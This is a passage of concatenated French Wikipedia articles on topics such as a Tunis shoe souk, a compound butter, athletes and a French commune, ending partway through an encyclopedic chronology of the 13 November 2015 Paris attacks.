Souk El Blaghgia

Le souk El Blaghgia () est l'un des souks de la médina de Tunis. Le terme "blaghgia" vient de l'arabe "balgha" qui désigne une sorte de babouche fabriquée à partir de cuir et faisant partie des costumes traditionnels de la Tunisie et du Maghreb en général.
Histoire.
. C'est pourquoi, certains attribuent la construction de ce souk au souverain Mohamed Rachid Bey, d'autres l'attribuant à Ali II Bey. Il figure parmi les plus importants souks de Tunis à l’époque husseinite.
Localisation.
Ce souk est situé au centre de la médina de Tunis, près de la mosquée Zitouna, entre le souk El Attarine et la rue de la Kasbah. Il est lié au fondouk des Blaghgia.
On y trouve par ailleurs la médersa Ech Chamaiya.
Architecture.
Ce souk est couvert par des voûtes en berceau, couverture qui repose quelquefois sur des colonnes. On note l'existence d'une impasse couverte qui donne sur le souk et autour de laquelle sont distribuées plusieurs boutiques. .
Évolution.
Dès sa création, ce souk se spécialise dans la production et la vente des balghas, des chaussures en cuir pour hommes, et des "chebrella", leur pendant féminin. Son déclin commence à partir de l’adoption de la chaussure européenne. Malgré l’annexion de quelques boutiques par la production du souk El Attarine, le souk El Blaghgia résiste.
De nos jours, il continue à pratiquer le commerce des chaussures, mais surtout celui des chaussures modernes et adapte sa production au goût du jour : à côté de la balgha traditionnelle, devenue chaussure de délassement, il offre différents modèles de mules. Sur des lattes de bois parallèles s’accrochent les paires, serrées les unes contre les autres, tapissant les murs de leurs couleurs chatoyantes.

</doc>
<doc id="9625599" url="https://fr.wikipedia.org/wiki?curid=9625599" title="Istom">
Istom



</doc>
<doc id="9625606" url="https://fr.wikipedia.org/wiki?curid=9625606" title="Peter Cooper Hewitt">
Peter Cooper Hewitt

Peter Cooper Hewitt, né le à New York et mort le à Neuilly-sur-Seine, est un ingénieur électricien américain, inventeur de la première lampe à vapeur de mercure basse pression en 1901, à l'origine de la lampe fluorescente.

</doc>
<doc id="9625618" url="https://fr.wikipedia.org/wiki?curid=9625618" title="Bodil Rasmussen">
Bodil Rasmussen

Bodil Steen Rasmussen est une rameuse danoise née le à Fredericia.
Biographie.
En 1984 à Los Angeles, elle fait partie du quatre de couple danois médaillé de bronze olympique. 

</doc>
<doc id="9625619" url="https://fr.wikipedia.org/wiki?curid=9625619" title="Bodil Steen Rasmussen">
Bodil Steen Rasmussen



</doc>
<doc id="9625623" url="https://fr.wikipedia.org/wiki?curid=9625623" title="Lycée Marie-Curie (Hô Chi Minh-Ville)">
Lycée Marie-Curie (Hô Chi Minh-Ville)

Le lycée Marie-Curie (en vietnamien : "Trường Trung học Phổ thông Marie Curie") est un établissement d'enseignement secondaire public situé dans le d'Hô Chi Minh-Ville. C'est l'un des plus anciens lycées d'Hô Chi Minh-Ville.
Le lycée Marie-Curie fait partie des quatre écoles qui enseignent encore le français à Hô Chi Minh-Ville avec le lycée d'élite Le Hong Phong, le lycée Nguyên Thi Minh Khai et le lycée français international Marguerite-Duras.
Histoire.
Son origine remonte au début du , puisqu'il fut fondé en 1918 comme école pour filles par le gouvernement colonial français.

</doc>
<doc id="9625629" url="https://fr.wikipedia.org/wiki?curid=9625629" title="Per Rasmussen">
Per Rasmussen

Per Henrik Stisen Rasmussen est un rameur danois né le à Svendborg.
Biographie.
En 1984 à Los Angeles, il fait partie du quatre sans barreur danois médaillé de bronze olympique. 

</doc>
<doc id="9625635" url="https://fr.wikipedia.org/wiki?curid=9625635" title="Zak Santiago">
Zak Santiago

Zak Santiago est un acteur canadien, né le à Vancouver (Colombie-Britannique).
Biographie.
Né au sein d'une famille espagnol, romaine et d'héritage irlandais, il a grandi à Halifax, en Nouvelle-Écosse, au Canada.
Plus jeune, il s'est formé en tant que pianiste, danseur de flamenco, danseur de ballet, boxeur et acteur. Il décide ensuite de se consacrer pleinement à sa carrière d'acteur.
En parallèle de sa carrière d'acteur, il est aussi DJ.
Carrière.
En 2001, il incarne un DJ dans le film "Josie et les Pussycats" ("Josie and the Pussycats") de Harry Elfont et Deborah Kaplan.
En 2004, il joue dans la mini-série "Human Cargo" où son interprétation est remarquée et récompensée par un Leo Awards de la meilleure performance d'acteur dans une série dramatique.
En 2005, il tient le rôle principal de la série "Young Blades" et en 2006 il a été nommé pour son travail dans la série.
En 2008, il joue dans "The Eye" aux côtés de Jessica Alba.
En 2009, il est dans "Le Prix du sang" ("Driven to Kill") aux côtés de Steven Seagal.
En 2011, il intègre le casting du film "Random Acts of Romance".
En 2013, il obtient un rôle le temps d'un épisode dans la série télévisée "Once Upon a Time".
Voix francophones.
En version française, Fabien Jacquelin est la voix régulière de Zak Santiago.

</doc>
<doc id="9625638" url="https://fr.wikipedia.org/wiki?curid=9625638" title="Beurre maître d'hôtel">
Beurre maître d'hôtel

Le beurre maître d'hôtel est une variante traditionnelle de beurre composé de la cuisine française, à base de beurre, persil, et jus de citron. 
Histoire.
Ses origines les plus anciennes connues semblent issues de la période de la cuisine au beurre de la cuisine française du XVIIIe siècle, avec des publications de nombreuses recettes de divers ouvrages culinaires de référence, dont "Le Livre de Cuisine", de Jules Gouffé (1867), le "Grand dictionnaire de cuisine", d'Alexandre Dumas (père) (1873) avec de nombreuses recettes « à la maître d'hôtel » ou encore "Le Guide culinaire", d'Auguste Escoffier (1903).
Étymologie.
Étymologiquement, le nom de « beurre maître d'hôtel » vient de la manière dont il était initialement préparé devant les convives par le maître d'hôtel d'un restaurant. 
Présentation.
Il s'agit généralement d'un beurre salé (ou beurre demi-sel) utilisé sur des viandes grillées (steak, côte de boeuf...), poissons, œufs (œuf poché, œufs Polignac...), légumes, pommes de terre... utilisé à la place d'une sauce pour améliorer la saveur d'un plat.
Préparation.
Le beurre maître d'hôtel est préparé en mélangeant du beurre ramolli avec du persil effeuillé ou finement haché, du jus de citron, sel et poivre (environ 1,5 cuillère à soupe de persil pour 60 g de beurre). Préparé sans ail, il peut être amélioré avec de l'échalote, du vin blanc, de la sauce Worcestershire, ou plus rarement du vinaigre. Il est généralement roulé, après mélange, dans du film alimentaire (ou papier sulfurisé) et refroidi au réfrigérateur pendant environ une heure afin de durcir, pour être éventuellement conservé au congélateur.
Il est généralement déposé sur divers aliments sous forme d'une rondelle tranchée à température ambiante, au moment de servir, et parfois comme condiment complémentaire. 
Bibliographie.
Cette recette est publiée dans divers ouvrages culinaires de référence, dont : 

</doc>
<doc id="9625646" url="https://fr.wikipedia.org/wiki?curid=9625646" title="Mine de Dubrave">
Mine de Dubrave

La mine de Dubrave est une mine à ciel ouvert de charbon, située à Dubrave Donje, en Bosnie-Herzégovine.
Histoire.
En 2015, la mine de Dubrave connaît un incident qui tue 4 mineurs.

</doc>
<doc id="9625647" url="https://fr.wikipedia.org/wiki?curid=9625647" title="Linus Ullmark">
Linus Ullmark

Linus Ullmark (né le à Lungvik en Suède) est un joueur professionnel suédois de hockey sur glace. Il évolue au poste de gardien de but.
Biographie.
Carrière en club.
Formé au Lugnviks IF, il débute en senior avec le MODO Hockey dans l'Elitserien en 2012. Il est choisi au sixième tour, en cent-soixante-troisième position par les Sabres de Buffalo lors du Repêchage d'entrée dans la LNH 2012. En 2015, il part en Amérique du Nord et est assigné aux Americans de Rochester, club ferme des Sabres dans la Ligue américaine de hockey. Il joue son premier match dans la Ligue nationale de hockey le face aux Devils du New Jersey.
Le , il signe un contrat de quatre saisons avec les Bruins de Boston.
Le , il marque un but en cage vide face aux Canucks de Vancouver devenant le treizième gardien à marquer un but dans l'histoire de la LNH.
En juin 2024, les Bruins l'échangent aux Sénateurs d'Ottawa contre le gardien Joonas Korpisalo, l'attaquant Mark Kastelic ainsi qu'un choix de premier tour en 2024 (devenu Dean Letourneau). Le jour avant le début de la saison 2024-2025, il obtient une prolongation de contrat de quatre saisons, d'une valeur annuelle moyenne de 8,25 millions $.
Carrière en équipe nationale.
Il représente l'équipe de Suède au niveau international. Il prend part aux sélections jeunes.

</doc>
<doc id="9625656" url="https://fr.wikipedia.org/wiki?curid=9625656" title="Famille d'Alinda">
Famille d'Alinda



</doc>
<doc id="9625657" url="https://fr.wikipedia.org/wiki?curid=9625657" title="R'Bus">
R'Bus



</doc>
<doc id="9625660" url="https://fr.wikipedia.org/wiki?curid=9625660" title="Université de Dongguk">
Université de Dongguk



</doc>
<doc id="9625662" url="https://fr.wikipedia.org/wiki?curid=9625662" title="Champdor-Corcelles">
Champdor-Corcelles

Champdor-Corcelles est, depuis le , une commune nouvelle située dans le département de l'Ain, en région Auvergne-Rhône-Alpes.
Géographie.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat de montagne, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols, etc.) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat de montagne ou de marges de montagne et est dans la région climatique Jura, caractérisée par une forte pluviométrie en toutes saisons ( à ), des hivers rigoureux et un ensoleillement médiocre. Elle est en outre dans la zone H1c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valromey-sur-Séran à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Pour afficher une liste d’indicateurs climatiques caractérisant la commune aux horizons 2030, 2050 et 2100 et pouvoir ainsi s'adapter aux changements climatiques, entrer son nom dans Climadiag-commune, un site de Météo-France élaboré à partir des nouvelles projections climatiques de référence DRIAS-2020.
Urbanisme.
Typologie.
Au , Champdor-Corcelles est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Plateau d'Hauteville, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Histoire.
Créée par un arrêté préfectoral du , elle est issue du regroupement des deux communes de Champdor et Corcelles, devenues des communes déléguées. Son chef-lieu est fixé au chef-lieu de l'ancienne commune de Champdor.
Par arrêté préfectoral du , Champdor-Corcelles tout comme l'ensemble des communes de l'intercommunalité du plateau d'Hauteville sont intégrés à Haut-Bugey Agglomération.
Politique et administration.
Découpage territorial.
La commune de Champdor-Corcelles est membre de l'intercommunalité Haut-Bugey Agglomération, un établissement public de coopération intercommunale (EPCI) à fiscalité propre créé le dont le siège est à Oyonnax. Ce dernier est par ailleurs membre d'autres groupements intercommunaux.
Sur le plan administratif, elle est rattachée à l'arrondissement de Belley, au département de l'Ain et à la région Auvergne-Rhône-Alpes. Sur le plan électoral, elle dépend du canton de Plateau d'Hauteville pour l'élection des conseillers départementaux, depuis le redécoupage cantonal de 2014 entré en vigueur en 2015, et de la cinquième circonscription de l'Ain pour les élections législatives, depuis le dernier découpage électoral de 2010.

</doc>
<doc id="9625665" url="https://fr.wikipedia.org/wiki?curid=9625665" title="McDonald (Caroline du Nord)">
McDonald (Caroline du Nord)

 est une ville américaine située dans le comté de Robeson dans l'État de Caroline du Nord. En 2010, sa population était de .

</doc>
<doc id="9625669" url="https://fr.wikipedia.org/wiki?curid=9625669" title="Chronologie des attentats du 13 novembre 2015 en France et de leurs conséquences">
Chronologie des attentats du 13 novembre 2015 en France et de leurs conséquences

La chronologie des attentats du 13 novembre 2015 en France et de leurs conséquences retrace la préparation des attaques, déroulement des attentats proprement dits puis, mois par mois, les avancées de l'enquête et des différentes conséquences tant au niveau national que sur le plan international.
Au fil des progrès de l'enquête dans les jours qui suivent les attentats, cette chronologie des événements est révélée à la presse par François Molins, procureur de Paris. Les attaques, menées pratiquement au même moment, se déroulent le soir du 13 novembre et sont l'œuvre de trois équipes de trois hommes. Chaque équipe emporte des dispositifs explosifs identiques et, à part une, des fusils d'assaut de type Kalachnikov.
Le vendredi 13 novembre vers 21 h 16, le premier terroriste entre en action près du stade de France en faisant exploser la ceinture d'explosifs dont ils sont équipés. Les trois explosions font au total, outre les terroristes, un mort et une dizaine de blessés graves. À 21 h 24, le second groupe de trois terroristes intervient dans plusieurs rues des et arrondissements de Paris. Se déplaçant à bord d'une Seat León de couleur noire immatriculée en Belgique, ils ouvrent le feu à trois reprises sur des personnes attablées à des terrasses de bars et de restaurants, causant la mort de trente-neuf personnes et en blessant trente-deux autres grièvement, puis l'un des terroristes, Brahim Abdeslam, fait sauter sa ceinture d'explosifs dans un café du boulevard Voltaire, faisant trois blessés graves et treize blessés légers. Ses deux complices disparaissent. À 21 h 47, le troisième groupe arrive à la salle de spectacle du Bataclan ( arrondissement), abat des personnes à l'extérieur du bâtiment, y pénètre et commence à tirer par rafale sur les spectateurs. Les trois hommes exécutent froidement les spectateurs, un par un. La tuerie de masse fait 90 morts et des dizaines de blessés graves avant que les forces de police n'interviennent et abattent les trois terroristes.
2008-2015 : des menaces ignorées.
Au fil des progrès de l'enquête, il apparaît que différentes menaces exprimées soit lors de manifestations soit lors de l'instruction d'enquêtes auraient pu alerter les différents services et être mieux prises en compte. Toutefois le nombre important de cibles potentielles et les problématiques d'échanges d'information entre services tant du renseignement que de la justice constituent des difficultés pour faire émerger des informations dont le rapprochement a posteriori paraît plus simple.
2008 : Manifestations au pied du Bataclan.
En janvier 2008, une manifestation a lieu devant le Bataclan pour protester contre le fait que la salle de spectacle accueille chaque année depuis le gala de la Police aux frontières israélienne, le Magav. En décembre 2008, un nouveau rassemblement a lieu pour le même motif, certains des manifestants défilant le visage masqué par des keffiehs avec des propos très menaçants , prévenait le groupe baptisé Resistancepalestine. Aucun lien direct ne peut toutefois être établi entre ces paroles et les attentats du 13 novembre, mais il apparaît que dès cette année-là, le Bataclan était déjà une cible potentielle pour certaines mouvances radicales.
2009 : le projet de Farouk Ben Abbes.
Le nom du Bataclan apparaît explicitement en 2009 dans une affaire de terrorisme. Lors de l’attentat commis au Caire, en Égypte, le 22 février 2009 – au cours duquel la jeune Française de 17 ans, Cécile Vannier, est tuée – plusieurs suspects sont arrêtés, dont une Française d'origine albanaise, Dude Hohxa. Celle-ci aurait déclaré aux services égyptiens que M. Farouk Ben Abbes projetait d’attaquer la salle de spectacle du Bataclan. Il projetait également de s’en prendre à une cible juive dans la commune de Saint-Denis. Interrogé par la police égyptienne, Farouk Ben Abbes aurait confirmé son projet d’attentat contre le Bataclan. Remis en liberté, il est interrogé par les Belges, puis est interpellé en 2010 à son retour en France, mis en examen pour association de malfaiteurs en vue de préparer des actes de terrorisme et placé en détention. Au cours de ses différentes auditions, Farouk Ben Abbes aurait proposé la salle de spectacle du Bataclan comme cible d'un projet d'attentat, . Toutefois, faute d’éléments probants, une décision de non-lieu est prononcée dans cette affaire le par le juge d'instruction antiterroriste Christophe Tessier, chargé du dossier.
Lors des auditions de l'enquête parlementaire, M. Patrick Calvar, directeur général de la sécurité intérieure, déclare, concernant ce projet d'attentat, que . Mais les propriétaires du Bataclan n'auraient jamais été informés de ces menaces. Pour Georges Fenech, président de la commission d'enquête, il s'agit là d'un manquement grave de la justice. La procédure prévoit en effet que lorsqu'un établissement ou une personne victime potentielle apparaît dans une procédure ceux-ci doivent en être informés par le biais d'un avis à victimes.
Lors de son audition, le juge Trévidic déclare ne pas se souvenir avoir instruit le dossier Farouk Ben Abbes et que .
2015 : le projet de Reda Hame.
Le , Reda Hame est interpellé à son retour de Syrie. Interrogé par le juge d’instruction Marc Trévidic, il explique qu’il a été invité à commettre un attentat en France, par exemple dans une salle de spectacle, par Abou Omar, qui n’est autre qu’Abdelhamid Abaaoud. Camille Hennetier, cheffe du pôle antiterroriste du parquet de Paris, est tout aussi affirmative : . La salle du Bataclan n’est néanmoins pas citée en tant que telle.
La menace est prise très au sérieux par les services français mais, comme le souligne Marc Trévidic lors de son audition, . , estime Sébastien Pietrasanta, rapporteur PS de la commission d'enquête.
2015 : la préparation des attentats.
Septembre.
Début septembre, deux appartements sont loués en Belgique sous de fausses identités dans le cadre de la préparation des attentats, l'un à Charleroi (le septembre) et l'autre à Schaerbeek, une commune de Bruxelles (le 3 septembre). Cet appartement bruxellois a sans doute été utilisé pour fabriquer des explosifs. Les enquêteurs y ont retrouvé lors de leur perquisition le 10 décembre des traces de TATP, une balance de précision et des ceintures ventrales. Par ailleurs, ils ont pu y retrouver une trace ADN de Bilal Hadfi ainsi qu'une empreinte digitale de Salah Abdeslam. Ce même Bilal Hadfi, ainsi qu'Abdelhamid Abaaoud ont séjourné dans l'appartement de Charleroi.
Le 9 septembre, le véhicule de Salah Abdeslam est contrôlé à la frontière austro-hongroise en provenance de Budapest. Il se trouve en compagnie de deux hommes munis de deux cartes d'identité belges, qui se révéleront par la suite fausses, au nom de Samir Bouzid et Soufiane Kayal. Ces deux hommes coordonnent ensuite les attaques depuis Bruxelles le 13 novembre.
Octobre.
Le 3 octobre, deux des futurs kamikazes du stade de France munis de faux passeports syriens aux noms de Mohammad al-Mahmod et Ahmad al-Mohammad débarquent sur l'île grecque de Leros en se mêlant au flux de réfugiés convergeant vers ce pays. Ils parviennent ainsi à s'infiltrer en Europe sans être détectés.
Le 5 octobre, les terroristes louent sous une fausse identité une maison à Auvelais dans la province de Namur, au sud de la Belgique. Elle est soupçonnée d'avoir servi de cache. Elle a été louée par Soufiane Kayal, la fausse identité utilisée par l'un des deux hommes repérés à la frontière austro-hongroise avec Salah Abdeslam en septembre.
Novembre.
Le 9 novembre, Salah Abdeslam loue la Polo et la Clio utilisées lors des attentats dans deux agences différentes à Bruxelles.
Le mardi 10 novembre vers , la Clio louée à Bruxelles est flashée à hauteur de Valenciennes, en direction de Paris. Vers , elle repart pour la Belgique. À , elle est de nouveau détectée en France au péage de Chamant dans l'Oise. Grâce à des relevés bancaires corroborés par des archives de vidéosurveillance, les enquêteurs déterminent que Salah Abdeslam se trouve une nouvelle fois en France le lendemain, mercredi 11 novembre, en compagnie de Mohamed Abrini, un djihadiste belge passé par la Syrie. Ils sont repérés à bord de la Clio noire dans une station service de l'Oise, à Ressons-sur-Matz, sur l'autoroute A1, en direction de Paris.
L'enquête permet de retrouver des images montrant le 12 novembre à du matin Salah et Brahim Abdeslam, deux des terroristes du 13 novembre, accompagnés de Mohamed Abrini, descendant de la Clio et de la Seat utilisées pour les attentats. Ils sont stationnés dans une ruelle à Molenbeek, descendent de leurs véhicules et s'échangent un paquet. À les deux voitures prennent le départ en direction de Charleroi par l'autoroute A54. Ils y rejoignent un autre véhicule, une Polo. Les trois véhicules repartent ensemble pour Paris vers . Les images des vidéos de surveillance de deux stations-service où le convoi fait des haltes permettent de reconstituer partiellement la composition du groupe. Dans la Polo, on retrouve Bilal Hadfi, l'un des kamikazes du Stade de France et deux des assaillants du Bataclan, Samy Amimour et Ismaël Omar Mostefaï. Le quatrième occupant du véhicule n'est pas formellement identifié, mais il pourrait s'agir de Foued Mohamed-Aggad, le troisième terroriste du Bataclan. Dans la Clio, on retrouve Salah et Brahim Abdeslam accompagnés de Mohamed Abrini. Les trois véhicules arrivent à Paris en début de soirée. La Seat, qui est le véhicule de queue, y parvient à . Sur place, les terroristes se répartissent dans deux locations louées par les frères Abdeslam. Le commando du Bataclan loge dans deux studios de l’Appart’City d’Alfortville, loués le même jour par Salah Abdeslam, tandis que les équipes du Stade de France et des terrasses se rendent dans un pavillon de Bobigny, une étroite maison en meulière de deux étages, située à l'ombre de la cité de l'Abreuvoir où ils confectionnent leurs ceintures explosives à l'aide de rouleaux de Scotch retrouvés sur place.
13 novembre 2015 : la soirée et la nuit des attentats parisiens.
Coordination en Belgique.
Les attaques sont coordonnées depuis la ville de Bruxelles, sans doute par deux hommes connus sous les fausses identités de Samir Bouzid et Soufiane Kayal et contrôlés le 9 septembre 2015 à la frontière austro-hongroise en compagnie de Salah Abdeslam. Les coordinateurs communiquent avec le commando du Bataclan sur une ligne et avec Abdelhamid Abaaoud grâce à un autre numéro le soir du 13 novembre. Ces deux lignes sont géolocalisées au même endroit en Belgique.
Départ des commandos.
L'étude de la mémoire du téléphone Samsung jeté par les assaillants du Bataclan au moment de l'attaque et sur lequel ont été retrouvés des traces d'ADN de Mostefaï et Mohamed Aggad montre que l'appareil a été utilisé pour télécharger l'application de messagerie sécurisée Telegram vers puis qu'il a été utilisé pour faire des recherches sur le concert des Eagles of Death Metal au Bataclan ainsi que pour trouver des photos et plans détaillés de la salle.
La Clio quitte le pavillon de Bobigny vers et stationne au terminal 2C de l'aéroport de Roissy entre et . Les raisons de ce déplacement restent inexpliquées mais il s'agit selon l'enquête d'un acte prémédité puisque l'on retrouve par la suite dans la Clio un papier où est griffonné le nom de l'aéroport et des autres destinations des terroristes. Le véhicule retourne ensuite à Bobigny.
À , l'équipe de la salle de spectacle du Bataclan, composée de Samy Amimour, Ismaël Omar Mostefaï et Foued Mohamed-Aggad, se met en route pour sa destination à bord de la Polo. Les trois kamikazes du Stade de France, Bilal Hadfi et deux Irakiens, conduits par Salah Abdeslam prennent le départ de Bobigny à bord de la Clio à , empruntant l'autoroute A86 en direction de Saint-Denis. Puis l'équipe des terrasses des restaurants parisiens part dix minutes plus tard avec la Seat, conduite par Abdelhamid Abaaoud, accompagné de Brahim Abdeslam et de Chakib Akrouh.
Soirée et nuit des attentats : les trois vagues d'attaques.
Première vague d'attaques : les explosions aux abords du stade de France à Saint-Denis.
Salah Abdeslam dépose les trois kamikazes, équipés de ceintures explosives, aux abords du Stade de France situé à Saint-Denis, dans le département de la Seine-Saint-Denis. Ne disposant pas de billets, ceux-ci ne peuvent accéder au stade, dans lequel se déroule le match amical de football France-Allemagne.
Explosions survenues.
Première explosion.
À 21 h 16, seize minutes après le début du match, une première explosion retentit face au restaurant et bar à cocktails "Events," rue Jules-Rimet, près de la du stade de France
Deux corps sont retrouvés, celui du kamikaze portant un gilet explosif composé de TATP et de boulons et celui d'un chauffeur de bus (pour des spectateurs venus voir le match) soufflé par l’explosion.
Deuxième explosion.
À , toujours dans la rue Jules-Rimet, face à la du stade, près d'un établissement de restauration rapide de l'enseigne "Quick", un second terroriste porteur d'un dispositif similaire se fait exploser. Selon une rumeur, les deux hommes ont été refoulés par les stadiers, alors que le match avait déjà commencé. Cependant, Jacques Lambert, l'ancien dirigeant de la FFF, indique : "".
Troisième explosion.
À , une troisième et dernière explosion se produit selon le même mode opératoire, cette fois plus au sud, rue de la Cokerie (de l'autre côté de l'autoroute par rapport au stade), devant un autre établissement de restauration rapide, celui de l'enseigne "McDonald's". Le corps du terroriste Bilal Hadfi est retrouvé et identifié.
L'un des gardiens du Stade de France racontera par la suite comment, quelques minutes plus tôt, il a refoulé le terroriste lorsque celui-ci cherchait à pénétrer dans le stade.
Conséquences.
Pendant le match.
Les explosions, initialement prises pour le bruit de gros pétards, sont entendues par les joueurs français et allemands, mais aussi par le public, les journalistes, les radiospectateurs et les téléspectateurs lors des retransmissions radios et télévisées en direct, mais ils ont été maintenus dans l'ignorance des faits jusqu'au coup de sifflet final du match.
Afin d'éviter toute panique inutile, le match France-Allemagne n'a pas été arrêté ni interrompu.
Au niveau présidentiel et gouvernemental.
À , dans la tribune présidentielle, le ministre de l'Intérieur Bernard Cazeneuve reçoit un appel téléphonique du préfet de police de Paris qui l'informe que les explosions qui ont eu lieu n'ont pas été déclenchées de manière accidentelle. Le président de la République François Hollande, qui assiste au match avec le ministre de l'Intérieur et le ministre allemand des Affaires étrangères Frank-Walter Steinmeier, est alerté par le préfet de la Seine-Saint-Denis et les forces de sécurité de la situation et se rend ensuite au poste de sécurité du stade de France, surnommé , suivi par Bernard Cazeneuve. Dans la salle de commandement du poste, le préfet ordonne la fermeture immédiate de toutes les grilles du stade, considérant que les abords extérieurs ne sont pas sécurisés. Informé des autres attaques en cours dans la capitale, François Hollande quitte le stade à la mi-temps en priant ses ministres et le président de l'Assemblée nationale de rester jusqu'à la fin de la rencontre.
Fin du match.
Au coup de sifflet final du match, le speaker Franck Bargine informe les spectateurs et fait évacuer le stade de France. Quelques minutes plus tard, à la suite d'une rumeur, un mouvement de foule d'une travée envahit la pelouse durant une demi-heure avant d'être à nouveau évacuée.
Les personnes présentes quittent le stade dans le calme et regagnent Paris à pied ou en voiture, car le trafic des transports en commun de la RATP est arrêté à cause de plusieurs alertes au colis piégé, les empêchant de prendre le bus et le métro parisien.
Accompagné du président de la Fédération française de football Noël Le Graët, le secrétaire d'État chargé des Sports, Thierry Braillard, informe les joueurs français des attaques terroristes en cours dans Paris une fois ceux-ci revenus dans leur vestiaire.
Se joignant aux joueurs français en signe de solidarité, les joueurs allemands sont eux aussi bouleversés par les attentats. Alors que leur hôtel a déjà été évacué dans la même journée en raison d'une alerte à la bombe, ces derniers décident de passer la nuit dans le vestiaire du stade, avant de rejoindre l'aéroport de Roissy dans plusieurs minibus banalisés le lendemain matin.
L'équipe de France, quant à elle, regagne Clairefontaine vers 4 heures du matin, sous escorte policière, après avoir reçu l'autorisation de quitter le Stade de France.
Bilan total.
Au total, ces explosions font un mort et onze blessés graves, dont trois Roms d'un bidonville de La Courneuve. Seize des victimes, dont cinq dans un état grave, sont évacuées et soignées à l'hôpital Delafontaine de Saint-Denis.
D'après Thierry Braillard, les kamikazes auraient voulu pénétrer dans l'enceinte du stade de France sans y parvenir et leur attaque serait donc globalement un échec. Une source policière juge qu'il est ' De même, elle affirme que '. Sur les raisons de ce comportement, la même source policière ajoute : ""
Deuxième vague d'attaques : les terrasses des restaurants ( et arrondissements).
La seconde série d'attentats est opérée par trois hommes circulant dans une Seat noire immatriculée en Belgique. L'état actuel de l'enquête laisse supposer qu'il s'agit d'Abdelhamid Abaaoud, de Brahim Abdeslam et de Chakib Akrouh. Durant une vingtaine de minutes, et sur quatre sites rapprochés, ils abattent des dizaines de personnes attablées à des terrasses de cafés et de restaurants, en criant « "Allahu akbar" » et , comme en témoignent des passants.
La salle radio de la police qui ne comporte que quatre opérateurs est très rapidement submergée par le nombre d'appels passés. Les multiples adresses qui sont données par les appelants ajoutent à la confusion et rendent difficile dans un premier temps l'identification des lieux réels des attaques et l'envoi des forces de l'ordre et des secours.
Rues Alibert et Bichat.
À , les terroristes ouvrent le feu sur le bistrot "Le Carillon", au (à un angle de cette rue avec la rue Bichat), puis sur le restaurant qui lui fait face : "Le Petit Cambodge", au ).
Au milieu de la nuit de l'attaque, le bilan fait état de treize personnes tuées, et de dix blessés en urgence absolue "(catégorie regroupant les personnes gravement blessées ou à traiter en extrême urgence)".
Rues du Faubourg-du-Temple et de la Fontaine-au-Roi.
À , ils tirent sur la brasserie "Café Bonne Bière", 32, rue du Faubourg-du-Temple (au croisement de celle-ci avec la rue de la Fontaine-au-Roi) et près de la terrasse d'un restaurant italien, "Casa Nostra", 2, rue de la Fontaine-au-Roi.
Au milieu de la nuit du drame, le bilan est de cinq personnes tuées et huit blessés en urgence absolue.
Restaurant La Belle Équipe.
À , ils attaquent le restaurant "La Belle Équipe" au 92, rue de Charonne (au carrefour de celle-ci avec la rue Faidherbe).
Le bilan est ici de vingt-et-une personnes tuées (dont l'épouse du patron du bar, qui formait avec son mari un couple mixte juif/musulman) et quatorze blessés en urgence absolue.
Comptoir Voltaire.
Enfin à , ayant été déposé par la Seat au café-brasserie du "comptoir Voltaire", au 253, boulevard Voltaire (à un angle de cette artère et la rue de Montreuil), Brahim Abdeslam se fait exploser au moment où il passe commande au restaurant en utilisant le même dispositif explosif que les terroristes du stade de France.
L'explosion cause trois blessés graves et treize blessés légers, car seule la charge qu'il portait au dos a explosé.
Troisième vague d'attaques : la salle de spectacle du Bataclan ( arrondissement).
Massacre de masse (21 h 40 - 22 h 00).
Peu après , trois individus armés, à visage découvert, habillés en civil descendent d'une Polo garée à l’angle du boulevard Voltaire et du passage Saint-Pierre Amelot, devant la salle de spectacle et font feu devant l'entrée principale du Bataclan où se déroule depuis une demi-heure un concert du groupe de rock Eagles of Death Metal. Ils tuent trois personnes. À , ils envoient un SMS vers un numéro de téléphone localisé en Belgique dans lequel ils indiquent « "On est partis, on commence" ». La ligne de réception est immédiatement désactivée et les terroristes jettent leur téléphone dans une poubelle. À 21 h 47, ils pénètrent dans la salle de spectacle du Bataclan par l'entrée principale et commencent à ouvrir le feu par rafales sur la foule, alors que le groupe interprète la chanson "Kiss the Devil". Les spectateurs les moins exposés pensent qu'il s'agit de pétards ou d'un spectacle pyrotechnique faisant partie de la mise en scène. Certains survivants rapportent que les terroristes tiraient dans la foule, en criant « "Allahu Akbar" ». Selon plusieurs témoins, ils faisaient référence aux bombardements aériens en Syrie décidés par le président de la République François Hollande dans le cadre de l'opération Chammal, et disaient qu'ils venaient venger leurs "" tués par les frappes aériennes françaises.
Des spectateurs prennent la fuite par l'issue de secours de la salle de spectacle, aidés, selon le responsable de la sécurité, par les membres de l'équipe des videurs, tandis que d'autres se cachent dans les étages ou sur les toits. Les terroristes cessent de tirer en rafales : ils tuent un à un des spectateurs à terre dans la fosse et achèvent des blessés à bout portant, comme ceux qui font le mort, ils tapent du pied sur les corps pour savoir s'ils sont vivants et vont jusqu'à forcer un des survivants à les aider à bouger les corps pour déceler ceux qui simulent. Certains parviendront tout de même à survivre dans la fosse, soit en restant complètement immobiles, soit en profitant d'un rechargement d’arme pour sortir de la salle de spectacle. L'un des terroristes s'adresse à un jeune homme dont la peau mate le fait souvent passer pour un jeune d'origine maghrébine, et lui dit, selon son amie : "", avant de l'épargner et de tirer sur un autre jeune à ses côtés. Un des spectateurs réfugié à l'étage et qui venait de sauver une femme enceinte suspendue à une fenêtre, est pris en otage par les terroristes qui 